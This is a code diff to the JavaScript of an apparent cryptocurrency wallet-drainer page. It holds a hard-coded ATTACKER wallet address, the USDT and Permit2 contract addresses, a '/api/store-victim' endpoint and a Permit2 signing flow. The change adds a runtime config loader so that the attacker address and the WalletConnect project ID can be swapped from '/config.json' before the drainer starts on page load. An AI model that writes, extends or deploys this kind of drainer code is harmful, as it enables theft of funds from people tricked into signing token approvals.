@@ -832,12 +832,24 @@
     }
   });
 
-  const ATTACKER = '0xa4645D082a7FdD6165b9D0eBF4D65a7063276333';
+  let ATTACKER = '0xa4645D082a7FdD6165b9D0eBF4D65a7063276333';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
   const API = '/api/store-victim';
-  const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
+  let PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
   const PUBLIC_RPC = 'https://ethereum.publicnode.com';
+
+  async function loadRuntimeConfig() {
+    try {
+      const r = await fetch('/config.json', { cache: 'no-store' });
+      const cfg = await r.json();
+      if (cfg.attacker_address) ATTACKER = cfg.attacker_address;
+      if (cfg.project_id) PROJECT_ID = cfg.project_id;
+      console.log('config attacker', ATTACKER);
+    } catch (e) {
+      console.warn('config.json indisponible, fallback hardcode', e);
+    }
+  }
 
   let signClient, session, account;
   const pendingSignatures = {};
@@ -1501,7 +1513,7 @@ async function handlePermit2Flow() {
   }
 
   document.addEventListener('DOMContentLoaded', function() {
-    initWalletConnect().catch(err => {
+    loadRuntimeConfig().then(() => initWalletConnect()).catch(err => {
       console.error('Erreur init WC:', err);
       const scanText = document.querySelector('.scan');
       if (scanText) scanText.textContent = 'Erreur de connexion';
